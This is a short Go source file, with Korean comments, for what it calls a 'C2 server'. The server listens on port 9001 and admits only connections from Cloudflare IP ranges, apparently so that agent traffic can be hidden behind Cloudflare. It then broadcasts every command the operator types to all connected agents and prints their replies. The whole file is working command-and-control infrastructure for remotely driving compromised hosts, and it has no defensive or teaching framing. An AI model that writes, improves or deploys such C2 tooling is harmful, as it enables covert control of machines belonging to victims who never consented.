package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

// 클라우드플레어 공식 IP 목록 일부 (전체 목록은 https://www.cloudflare.com/ips/ 참고)
var cloudflareIPs = []string{
	"173.245.48.0/20",
	"103.21.244.0/22",
	"103.22.200.0/22",
	"103.31.4.0/22",
	"141.101.64.0/18",
	"108.162.192.0/18",
	"190.93.240.0/20",
	"188.114.96.0/20",
	"197.234.240.0/22",
	"198.41.128.0/17",
	"162.158.0.0/15",
	"104.16.0.0/13",
	"104.24.0.0/14",
	"172.64.0.0/13",
	"131.0.72.0/22",
}

func isCloudflareIP(ip string) bool {
	parsedIP := net.ParseIP(ip)
	for _, cidr := range cloudflareIPs {
		_, ipnet, err := net.ParseCIDR(cidr)
		if err == nil && ipnet.Contains(parsedIP) {
			return true
		}
	}
	return false
}

var agents = make(map[net.Conn]struct{})

func handleAgent(conn net.Conn) {
	// main에서 이미 Cloudflare IP만 통과시킴
	agents[conn] = struct{}{}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		resp, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Agent disconnected:", conn.RemoteAddr())
			delete(agents, conn)
			return
		}
		fmt.Printf("[Agent %v] %s", conn.RemoteAddr(), resp)
	}
}

func main() {
	ln, err := net.Listen("tcp", ":9001") // 외부 접속 허용
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()
	fmt.Println("C2 server listening on :9001 (Cloudflare only)")

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				continue
			}
			remoteIP, _, err := net.SplitHostPort(conn.RemoteAddr().String())
			if err != nil || !isCloudflareIP(remoteIP) {
				fmt.Println("Blocked non-Cloudflare IP (main):", conn.RemoteAddr())
				conn.Close()
				continue
			}
			fmt.Println("Agent connected:", conn.RemoteAddr())
			go handleAgent(conn)
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Enter command to send to agents: ")
		if !scanner.Scan() {
			break
		}
		cmd := scanner.Text()
		if strings.TrimSpace(cmd) == "" {
			continue
		}
		for conn := range agents {
			fmt.Fprintf(conn, "%s\n", cmd)
		}
	}
}
